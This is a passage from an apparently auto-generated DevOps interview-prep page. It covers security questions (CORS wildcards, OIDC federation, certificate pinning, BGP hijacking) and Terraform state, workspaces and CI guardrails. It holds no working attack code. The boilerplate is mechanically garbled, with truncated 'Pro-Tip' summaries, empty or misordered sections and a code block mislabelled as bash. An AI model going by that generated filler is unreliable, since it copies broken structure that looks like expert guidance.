**CORS (Cross-Origin Resource Sharing)** is a browser security mechanism that inherently blocks a malicious website (like `evil.com`) from pulling sensitive data from an API (like `yourbank.com`) using the victim's active session. By setting `Access-Control-Allow-Origin: *` (wildcard), the developer tells the browser that *any* website in the world is allowed to read responses from the API. If the API relies on session cookies, an attacker can host a malicious page, trick the victim into visiting it, and the malicious page can silently query the API using the victim's authenticated browser session. The browser will permit the script to read the sensitive JSON data returned because the wildcard CORS header explicitly authorized it. ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: CORS (Cross-Origin Resource Sharing) is a browser security mechanism that inherently blocks a malicious website (like evil.com) fr.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: CORS (Cross-Origin Resource Sharing) is a browser security mechanism that inherently blocks a m
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-178-security-q37-you-use-github-actions-to-deploy-to-aws-currently-you-store-long-lived-aws-iam-access-keys-as-github-repository-secrets-why-is-this-an-anti-pattern-and-what-is-the-modern-secure-alternative-l3"></a>
### 178. Security Q37: You use GitHub Actions to deploy to AWS Currently you store long-lived AWS IAM Access Keys as GitHub Repository Secrets Why is this an anti-pattern and what is the modern secure alternative [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `Security` • `Security` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `Security` `Security` `L3` `DevSecOps` `Compliance`

> **Interview Question:**  
> *"You use GitHub Actions to deploy to AWS. Currently, you store long-lived AWS IAM Access Keys as GitHub Repository Secrets. Why is this an anti-pattern, and what is the modern, secure alternative?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"Security in modern DevOps must be automated into the pipeline rather than bolted on after deployment. The interviewer is testing: OIDC (OpenID Connect), CI/CD federation, eliminating long-lived secrets.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Storing long-lived static credentials in a third-party CI/CD platform is an anti-pattern because if the platform is compromised (or a developer accidentally dumps the environment variables in a CI log), the keys are permanently exposed until manually revoked. The modern, secure alternative is **OIDC (OpenID Connect) Federation**. Instead of storing static keys, you configure an OIDC Identity Provider in AWS that trusts GitHub's token authority. In the GitHub Action, the pipeline requests a short-lived OIDC JSON Web Token from GitHub, cryptographically proving it represents a specific repository and branch. The pipeline sends this JWT to AWS STS via `AssumeRoleWithWebIdentity`. AWS validates the token signature and returns short-lived, temporary session credentials valid only for the duration of the deployment. Zero permanent secrets are stored anywhere. ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Storing long-lived static credentials in a third-party CI/CD platform is an anti-pattern because if the platform is compromised (o.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Storing long-lived static credentials in a third-party CI/CD platform is an anti-pattern becaus
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-179-security-q38-your-mobile-application-uses-https-to-securely-communicate-with-its-backend-however-a-security-researcher-installs-a-custom-root-ca-on-their-phone-proxies-the-traffic-through-a-tool-like-burp-suite-and-successfully-intercepts-the-plaintext-api-calls-what-security-control-is-the-mobile-app-missing-l2"></a>
### 179. Security Q38: Your mobile application uses HTTPS to securely communicate with its backend However a security researcher installs a custom root CA on their phone proxies the traffic through a tool like Burp Suite and successfully intercepts the plaintext API calls What security control is the mobile app missing [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `Security` • `Security` | **Type:** `Production Scenario [L2]`

**Tags:** `Security` `Security` `L2` `DevSecOps` `Compliance`

> **Interview Question:**  
> *"Your mobile application uses HTTPS to securely communicate with its backend. However, a security researcher installs a custom root CA on their phone, proxies the traffic through a tool like Burp Suite, and successfully intercepts the plaintext API calls. What security control is the mobile app missing?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When an interviewer asks how I respond to this security vulnerability, I emphasize immediate blast-radius containment. The interviewer is testing: Certificate Pinning, mobile app security, MITM proxies.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

By default, mobile OS environments and browsers unconditionally trust any certificate signed by a Root CA located in their system trust store. Because the researcher installed their own malicious Root CA into the phone's trust store, the app blindly accepts the proxy's forged certificates, allowing the MITM attack. To prevent this, the mobile application must implement **Certificate Pinning (or Public Key Pinning)**. The app's source code is hardcoded ("pinned") to only trust the specific cryptographic hash of the backend server's true certificate (or its true CA). When the proxy presents its forged certificate, even if it's considered "valid" by the phone's OS, the application logic will instantly reject the connection because the hash does not match the hardcoded pin. ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: By default, mobile OS environments and browsers unconditionally trust any certificate signed by a Root CA located in their system .

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: By default, mobile OS environments and browsers unconditionally trust any certificate signed by
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-180-security-q39-explain-the-three-core-components-of-the-cia-triad-in-information-security-l1"></a>
### 180. Security Q39: Explain the three core components of the CIA Triad in Information Security [L1]

**Level:** `Junior / Associate DevOps [L1]` | **Category:** `Security` • `Security` | **Type:** `Core Fundamentals [L1]`

**Tags:** `Security` `Security` `L1` `DevSecOps` `Compliance`

> **Interview Question:**  
> *"Explain the three core components of the CIA Triad in Information Security."*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our DevSecOps implementation, we solved this by introducing automated security quality gates. The interviewer is testing: Fundamental security theory.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

The **CIA Triad** forms the foundation of all information security frameworks:

- **Confidentiality:** Guaranteeing that sensitive data is accessed *only* by authorized individuals (e.g., using Encryption, Identity and Access Management).
- **Integrity:** Guaranteeing that data has not been maliciously tampered with or corrupted in transit or at rest (e.g., using Hashing algorithms, Digital Signatures, Immutable backups).
- **Availability:** Guaranteeing that authorized users have reliable and timely access to systems and data when needed (e.g., using Load Balancers, DDoS mitigation, Disaster Recovery failovers).

##### 2️⃣ Remediation & Permanent Safeguards

---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Confidentiality: Guaranteeing that sensitive data is accessed *only* by authorized individuals (e.g., using Encryption, Identity a.

#### ⏱️ 60-Second Elevator Pitch Summary

- Confidentiality: Guaranteeing that sensitive data is accessed *only* by authorized individuals (e...
- Integrity: Guaranteeing that data has not been maliciously tampered with or corrupted in transit ...
- Availability: Guaranteeing that authorized users have reliable and timely access to systems and d...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-181-security-q40-a-sophisticated-attacker-wants-to-intercept-your-companys-web-traffic-even-though-your-dns-is-secure-they-manage-to-physically-hijack-the-routing-paths-of-the-internet-so-traffic-destined-for-your-datacenter-ip-addresses-is-sent-to-their-servers-in-russia-what-is-this-attack-called-and-what-defensive-protocol-mitigates-it-l3"></a>
### 181. Security Q40: A sophisticated attacker wants to intercept your companys web traffic Even though your DNS is secure they manage to physically hijack the routing paths of the internet so traffic destined for your datacenter IP addresses is sent to their servers in Russia What is this attack called and what defensive protocol mitigates it [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `Security` • `Security` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `Security` `Security` `L3` `DevSecOps` `Compliance`

> **Interview Question:**  
> *"A sophisticated attacker wants to intercept your company's web traffic. Even though your DNS is secure, they manage to physically hijack the routing paths of the internet so traffic destined for your datacenter IP addresses is sent to their servers in Russia. What is this attack called, and what defensive protocol mitigates it?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"Least-privilege access, encrypted secrets in transit/at rest, and continuous vulnerability scanning are foundational. The interviewer is testing: BGP Hijacking, Border Gateway Protocol, RPKI (Resource Public Key Infrastructure).. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

This is a **BGP Hijacking** attack. The internet relies on the Border Gateway Protocol (BGP), where networks announce to each other which IP prefixes they own. By default, BGP operates on implicit trust. A malicious ISP can announce to the world that it is the fastest route to your IP space, and global routers will dynamically update and siphon your traffic into the attacker's black hole. The primary defensive mitigation is **RPKI (Resource Public Key Infrastructure)**. RPKI is a cryptographic framework that uses Route Origin Authorizations (ROAs) signed by regional internet registries. When RPKI is enforced, global backbone routers will mathematically verify the cryptographic signature of a BGP announcement against the RPKI authority before accepting the route, causing the attacker's forged announcement to be automatically dropped.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: This is a BGP Hijacking attack. The internet relies on the Border Gateway Protocol (BGP), where networks announce to each other wh.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: This is a BGP Hijacking attack. The internet relies on the Border Gateway Protocol (BGP), where
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-182-terraform-q2-two-developers-ran-terraform-apply-at-the-same-time-on-the-same-workspace-what-happened-and-how-do-you-prevent-it-l2"></a>
### 182. Terraform Q2: Two developers ran terraform apply at the same time on the same workspace What happened and how do you prevent it [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `Terraform` • `State & Locking` | **Type:** `Production Scenario [L2]`

**Tags:** `Terraform` `State & Locking` `L2` `IaC` `Cloud Infrastructure`

> **Interview Question:**  
> *"Two developers ran `terraform apply` at the same time on the same workspace. What happened and how do you prevent it?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When terraform plan shows unexpected changes, my golden rule is: never apply blindly. Investigate the diff first. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

This is a race condition. The last write wins — whichever apply finishes last overwrites the state file. This can cause state corruption and out-of-sync infrastructure.

- Use an S3 backend with DynamoDB locking: Terraform writes a lock entry to DynamoDB before applying. If another apply is running, the lock is already taken and the second apply waits or fails.
- Terraform Cloud/HCE automatically handles locking.
- Never use local state files for team work — they can't be locked.

##### 2️⃣ Remediation & Permanent Safeguards

Prevention — **state locking**: Best practice: Run Terraform only from CI/CD pipelines, never from developer laptops directly. The pipeline enforces sequential execution. ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Use an S3 backend with DynamoDB locking: Terraform writes a lock entry to DynamoDB before applying. If another apply is running, t.

#### ⏱️ 60-Second Elevator Pitch Summary

- Use an S3 backend with DynamoDB locking: Terraform writes a lock entry to DynamoDB before applyin...
- Terraform Cloud/HCE automatically handles locking.
- Never use local state files for team work — they can't be locked.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-183-terraform-q3-your-terraform-state-file-got-corrupted-what-do-you-do-l2"></a>
### 183. Terraform Q3: Your Terraform state file got corrupted What do you do [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `Terraform` • `State & Locking` | **Type:** `Production Scenario [L2]`

**Tags:** `Terraform` `State & Locking` `L2` `IaC` `Cloud Infrastructure`

> **Interview Question:**  
> *"Your Terraform state file got corrupted. What do you do?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our enterprise Terraform repository, we designed reusable modules and remote backends to prevent this exact issue. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

Never manually edit the `.tfstate` file directly — it's JSON with checksums. If you must, use `terraform state` commands.

- **If using remote backend with versioning (S3 + versioning enabled)** — restore the previous version of the state file from S3.
- **If using Terraform Cloud** — it keeps state history. Roll back to last known good state.
- **Manual reconstruction** — worst case: use `terraform import` to re-import all existing resources into a fresh state file. Painful but possible.

##### 2️⃣ Remediation & Permanent Safeguards

---

- **Prevention** — always use remote backend, enable S3 versioning, enable Terraform state locking.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: If using remote backend with versioning (S3 + versioning enabled) — restore the previous version of the state file from S3..

#### ⏱️ 60-Second Elevator Pitch Summary

- If using remote backend with versioning (S3 + versioning enabled) — restore the previous version ...
- If using Terraform Cloud — it keeps state history. Roll back to last known good state.
- Manual reconstruction — worst case: use terraform import to re-import all existing resources into...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-184-terraform-q4-you-have-a-terraform-configuration-that-manages-resources-in-3-aws-accounts-how-do-you-structure-this-l3"></a>
### 184. Terraform Q4: You have a Terraform configuration that manages resources in 3 AWS accounts How do you structure this [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `Terraform` • `State & Locking` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `Terraform` `State & Locking` `L3` `IaC` `Cloud Infrastructure`

> **Interview Question:**  
> *"You have a Terraform configuration that manages resources in 3 AWS accounts. How do you structure this?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"Treat Terraform code with the same rigor as application code: pre-merge plans, state locks, and automated drift detection. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Use multiple provider configurations with **aliases** or split into multiple **workspaces/modules**: Better approach at scale: **separate Terraform root modules per account**. Each module has its own state file, backend config, and runs independently. Avoid cross-account state dependencies — they create tight coupling. Use Terragrunt to DRY (Don't Repeat Yourself) across multiple root modules. ---

```hcl
provider "aws" {
  alias  = "account-a"
  assume_role {
    role_arn = "arn:aws:iam::111111111:role/terraform"
  }
}

provider "aws" {
  alias  = "account-b"
  assume_role {
    role_arn = "arn:aws:iam::222222222:role/terraform"
  }
}

resource "aws_s3_bucket" "a" {
  provider = aws.account-a
  bucket   = "my-bucket-a"
}
```

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Use multiple provider configurations with aliases or split into multiple workspaces/modules:.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Use multiple provider configurations with aliases or split into multiple workspaces/modules:
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-185-terraform-q6-how-do-you-structure-a-large-terraform-codebase-for-a-multi-environment-setup-l2"></a>
### 185. Terraform Q6: How do you structure a large Terraform codebase for a multi-environment setup [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `Terraform` • `Modules & Structure` | **Type:** `Production Scenario [L2]`

**Tags:** `Terraform` `Modules & Structure` `L2` `IaC` `Cloud Infrastructure`

> **Interview Question:**  
> *"How do you structure a large Terraform codebase for a multi-environment setup?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When terraform plan shows unexpected changes, my golden rule is: never apply blindly. Investigate the diff first. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

Recommended structure:

- Has its own `terraform.tfstate` (separate remote backend key per env).
- Calls the same modules with different variable values.
- Can be planned/applied independently.

##### 2️⃣ Remediation & Permanent Safeguards

Each environment directory: **Terragrunt** simplifies this further by handling backend config, module sourcing, and dependency between environments. ---

```hcl
infrastructure/
├── modules/              # reusable modules
│   ├── networking/
│   ├── eks/
│   └── rds/
├── environments/
│   ├── dev/
│   │   ├── main.tf       # calls modules with dev vars
│   │   ├── variables.tf
│   │   └── terraform.tfvars
│   ├── staging/
│   └── production/
└── global/               # shared resources (IAM, Route53)
```

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Has its own terraform.tfstate (separate remote backend key per env)..

#### ⏱️ 60-Second Elevator Pitch Summary

- Has its own terraform.tfstate (separate remote backend key per env).
- Calls the same modules with different variable values.
- Can be planned/applied independently.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-186-terraform-q8-how-do-you-handle-sensitive-outputs-like-db-passwords-in-terraform-modules-l3"></a>
### 186. Terraform Q8: How do you handle sensitive outputs (like DB passwords) in Terraform modules [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `Terraform` • `Modules & Structure` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `Terraform` `Modules & Structure` `L3` `IaC` `Cloud Infrastructure`

> **Interview Question:**  
> *"How do you handle sensitive outputs (like DB passwords) in Terraform modules?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"Treat Terraform code with the same rigor as application code: pre-merge plans, state locks, and automated drift detection. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

Terraform masks the value in plan/apply output.

- **Mark outputs as sensitive**:
- **Don't output secrets if possible** — reference the resource directly, or retrieve the secret from Secrets Manager at runtime instead of passing through Terraform output.
- **State contains secrets in plaintext** — if Terraform creates a password, it's in the state file. Use S3 SSE encryption for the state file. Use a remote backend with access controls.

##### 2️⃣ Remediation & Permanent Safeguards

---

- **Better pattern** — let Terraform create the DB, then generate the password in AWS Secrets Manager (using `aws_secretsmanager_secret_version`). App retrieves it from Secrets Manager at runtime. Password never in Terraform outputs.

```bash
output "db_password" {
  value     = aws_db_instance.main.password
  sensitive = true
}
```

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Mark outputs as sensitive:.

#### ⏱️ 60-Second Elevator Pitch Summary

- Mark outputs as sensitive:
- Don't output secrets if possible — reference the resource directly, or retrieve the secret from S...
- State contains secrets in plaintext — if Terraform creates a password, it's in the state file. Us...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-187-terraform-q9-what-is-terraform-taint-and-when-would-you-use-it-l2"></a>
### 187. Terraform Q9: What is terraform taint and when would you use it [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `Terraform` • `Modules & Structure` | **Type:** `Production Scenario [L2]`

**Tags:** `Terraform` `Modules & Structure` `L2` `IaC` `Cloud Infrastructure`

> **Interview Question:**  
> *"What is `terraform taint` and when would you use it?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"Managing infrastructure as code across multiple teams requires disciplined state management and locking. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

`terraform taint ` marks a resource for destruction and recreation on the next `terraform apply`. Even if nothing in the config changed.

- A resource is in a broken/inconsistent state in the cloud but Terraform's state says it's fine.
- You want to force recreation of an EC2 instance to apply a new AMI (for resources that can't be updated in-place).

##### 2️⃣ Remediation & Permanent Safeguards

Use cases: In Terraform 0.15.2+, `terraform taint` is replaced by `terraform apply -replace=` which is more explicit. Note: tainting deletes and recreates. For stateful resources (databases, volumes), this means data loss. Be careful. ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: A resource is in a broken/inconsistent state in the cloud but Terraform's state says it's fine..

#### ⏱️ 60-Second Elevator Pitch Summary

- A resource is in a broken/inconsistent state in the cloud but Terraform's state says it's fine.
- You want to force recreation of an EC2 instance to apply a new AMI (for resources that can't be u...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-188-terraform-q12-you-need-to-move-a-terraform-resource-from-one-module-to-another-without-destroying-and-recreating-it-how-l3"></a>
### 188. Terraform Q12: You need to move a Terraform resource from one module to another without destroying and recreating it How [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `Terraform` • `Import & Migrations` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `Terraform` `Import & Migrations` `L3` `IaC` `Cloud Infrastructure`

> **Interview Question:**  
> *"You need to move a Terraform resource from one module to another without destroying and recreating it. How?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"Treat Terraform code with the same rigor as application code: pre-merge plans, state locks, and automated drift detection. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Use `terraform state mv`: Then update the configuration (move the resource block to the new module). Run `terraform plan` — should show no changes if the state move was done correctly. **Terraform 1.1+ `moved` blocks** — the modern approach, tracked as code: This is self-documenting and can be committed to Git. --- ## 🟡 Workspaces & CI/CD ---

```hcl
# Move from root to a module
terraform state mv aws_s3_bucket.my_bucket module.storage.aws_s3_bucket.my_bucket

# Move between modules  
terraform state mv module.old.aws_s3_bucket.bucket module.new.aws_s3_bucket.bucket
```

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Use terraform state mv:.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Use terraform state mv:
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-189-terraform-q13-what-is-a-terraform-workspace-and-what-are-its-limitations-l2"></a>
### 189. Terraform Q13: What is a Terraform workspace and what are its limitations [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `Terraform` • `Workspaces & CI/CD` | **Type:** `Production Scenario [L2]`

**Tags:** `Terraform` `Workspaces & CI/CD` `L2` `IaC` `Cloud Infrastructure`

> **Interview Question:**  
> *"What is a Terraform workspace and what are its limitations?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"Managing infrastructure as code across multiple teams requires disciplined state management and locking. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

Workspaces let you maintain multiple state files for the same configuration. `terraform workspace new staging` creates a `staging` workspace with its own state.

- All workspaces use the same code — config differences between environments are hard (you'd use `terraform.workspace` variable conditionals, which gets messy).
- Same backend — all workspace state files are in the same S3 bucket, just different keys.
- No access control — you can't restrict who applies to production workspace vs dev workspace.

##### 2️⃣ Remediation & Permanent Safeguards

**Limitations:** **Use workspaces for:** small teams, temporary environments, exactly-same-config use cases. **Don't use workspaces for:** production vs staging (different configs, different access controls). ---

- Better alternative for multiple environments: separate directories/modules, not workspaces.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: All workspaces use the same code — config differences between environments are hard (you'd use terraform.workspace variable condit.

#### ⏱️ 60-Second Elevator Pitch Summary

- All workspaces use the same code — config differences between environments are hard (you'd use te...
- Same backend — all workspace state files are in the same S3 bucket, just different keys.
- No access control — you can't restrict who applies to production workspace vs dev workspace.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-190-terraform-q14-how-do-you-run-terraform-safely-in-a-ci-cd-pipeline-what-are-the-guardrails-l3"></a>
### 190. Terraform Q14: How do you run Terraform safely in a CI/CD pipeline What are the guardrails [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `Terraform` • `Workspaces & CI/CD` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `Terraform` `Workspaces & CI/CD` `L3` `IaC` `Cloud Infrastructure`

> **Interview Question:**  
> *"How do you run Terraform safely in a CI/CD pipeline? What are the guardrails?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When terraform plan shows unexpected changes, my golden rule is: never apply blindly. Investigate the diff first. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

**State handling:**

- Remote backend (S3 + DynamoDB locking) — never local state in CI.
- Each pipeline run acquires lock before apply, releases after.
- `terraform plan -out=plan.tfplan` in one stage.
- Human reviews the plan (or automated check for unexpected destroys).
- `terraform apply plan.tfplan` in a separate stage.
- Fail the pipeline if plan shows any `destroy` without explicit override.
- Run `terraform fmt -check` to fail on unformatted code.

##### 2️⃣ Remediation & Permanent Safeguards

**Plan before apply:** **Guardrails:** **No developer applies directly:** ---

- Run `terraform validate` to check syntax.
- Run `tflint` for provider-specific lint rules.
- Run `tfsec` or `checkov` for security misconfigurations.
- Separate pipelines for different environments. Production requires manual approval.
- All Terraform runs go through CI.
- Developers open PRs → plan runs → review → merge → apply runs.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Remote backend (S3 + DynamoDB locking) — never local state in CI..

#### ⏱️ 60-Second Elevator Pitch Summary

- Remote backend (S3 + DynamoDB locking) — never local state in CI.
- Each pipeline run acquires lock before apply, releases after.
- terraform plan -out=plan.tfplan in one stage.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-191-terraform-q16-how-do-you-scan-terraform-code-for-security-misconfigurations-before-applying-l2"></a>
### 191. Terraform Q16: How do you scan Terraform code for security misconfigurations before applying [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `Terraform` • `Security & Best Practices` | **Type:** `Production Scenario [L2]`

**Tags:** `Terraform` `Security & Best Practices` `L2` `IaC` `Cloud Infrastructure`

> **Interview Question:**  
> *"How do you scan Terraform code for security misconfigurations before applying?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"Treat Terraform code with the same rigor as application code: pre-merge plans, state locks, and automated drift detection. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

Several tools:

- **tfsec** — open source. Checks for common security issues (S3 public access, unencrypted EBS, open security groups, missing logging).
- **checkov** — open source. Broader coverage. Also supports CloudFormation, K8s, Helm.
- **Snyk IaC** — commercial. Deep AWS/Azure/GCP policy coverage.

##### 2️⃣ Remediation & Permanent Safeguards

Add to CI: run before `terraform apply`. Fail the pipeline on HIGH severity findings. Example: `tfsec .` in CI stage. Fail if any HIGH/CRITICAL issues. ---

- **OPA + Conftest** — write your own custom policies in Rego language.
- **Terrascan** — NIST, SOC2, HIPAA, CIS benchmark checks.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: tfsec — open source. Checks for common security issues (S3 public access, unencrypted EBS, open security groups, missing logging)..

#### ⏱️ 60-Second Elevator Pitch Summary

- tfsec — open source. Checks for common security issues (S3 public access, unencrypted EBS, open s...
- checkov — open source. Broader coverage. Also supports CloudFormation, K8s, Helm.
- Snyk IaC — commercial. Deep AWS/Azure/GCP policy coverage.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-192-terraform-q18-what-is-the-terraform-remote-state-data-source-and-what-are-the-risks-of-using-it-l2"></a>
### 192. Terraform Q18: What is the terraform_remote_state data source and what are the risks of using it [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `Terraform` • `Security & Best Practices` | **Type:** `Production Scenario [L2]`

**Tags:** `Terraform` `Security & Best Practices` `L2` `IaC` `Cloud Infrastructure`

> **Interview Question:**  
> *"What is the `terraform_remote_state` data source and what are the risks of using it?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
